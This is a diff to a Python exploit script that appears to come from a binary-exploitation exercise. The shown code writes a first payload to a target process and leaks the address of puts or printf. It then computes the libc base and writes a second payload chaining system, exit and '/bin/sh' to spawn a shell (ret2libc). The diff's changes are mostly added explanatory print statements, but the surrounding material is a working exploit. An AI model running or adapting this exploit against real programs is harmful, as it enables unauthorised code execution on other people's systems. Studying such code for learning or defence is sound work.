@@ -321,6 +321,7 @@ proc.process(payload_name)
 phandle.open()
 phandle.write(first_evil.get_payload())
 print("First payload is written")
+print("")
 
 tempstr = payload_name + "\n"
 # print("Reading until following bytes:", tempstr.encode('utf-8'))
@@ -350,6 +351,7 @@ else:
     recvdata = recvdata[:4]
 
 leaked_bytes = bytearray.fromhex(recvdata.hex())
+leaked_bytes_int = int.from_bytes(leaked_bytes, byteorder='little')
 if found_printf:
     print("")
     print("Leaked address of printf:",
@@ -357,7 +359,7 @@ if found_printf:
 else:
     print("")
     print("Leaked address of puts:",
-          hex(int.from_bytes(leaked_bytes, byteorder='little')))
+          hex(leaked_bytes_int))
 
 if len(leaked_bytes) == 0:
     print("Exploit failed, no address leaked")
@@ -375,6 +377,9 @@ else:
     libc_base_address = int.from_bytes(leaked_bytes, byteorder='little') - \
                         hex_to_int(puts_offset)
 
+print("Calculation of libc address = leaked address of puts - offset of puts")
+print("Calculation of libc address =", hex(leaked_bytes_int)[2:], "-", puts_offset)
+
 print("Calculated libc address:", hex(libc_base_address))
 
 system_address = libc_base_address + hex_to_int(system_offset)
@@ -391,7 +396,7 @@ second_evil.add_content(exit_address)
 second_evil.add_content(binsh_address)
 
 print("")
-print("Second payload written")
+print("Second payload is written")
 
 phandle.write(second_evil.get_payload())
 # second_evil.write_to_plaintext("debug_" + program_name + "_payload_2")
